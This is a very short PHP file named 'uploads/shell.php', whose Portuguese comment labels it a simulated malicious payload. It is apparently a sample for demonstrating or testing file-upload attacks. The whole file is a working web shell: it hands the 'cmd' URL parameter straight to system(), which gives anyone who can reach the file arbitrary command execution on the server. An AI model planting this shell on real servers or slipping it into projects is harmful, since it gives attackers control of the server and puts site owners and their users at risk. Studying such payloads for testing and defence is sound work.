<?php
// uploads/shell.php (simulação de payload malicioso)
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>